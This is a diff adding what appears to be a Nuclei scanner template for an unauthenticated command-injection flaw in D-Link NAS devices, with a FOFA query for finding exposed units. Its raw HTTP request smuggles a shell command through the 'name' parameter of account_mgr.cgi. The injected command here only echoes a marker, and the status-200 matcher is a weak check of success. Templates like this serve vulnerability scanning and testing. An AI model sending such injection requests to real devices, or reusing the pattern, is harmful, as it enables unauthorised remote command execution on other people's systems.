@@ -1,0 +1,31 @@
+id: poc-qp15c7mx6xgtnkni
+info:
+  name: D-Link NAS设备account_mgr.cgi-未授权RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qp15c7mx6xgtnkni'
+  tags: rce,unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qp15c7mx6xgtnkni
+    fofa: app="D_Link-DNS-ShareCenter"
+http:
+- raw:
+  - 'GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;echo+123456;%27 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
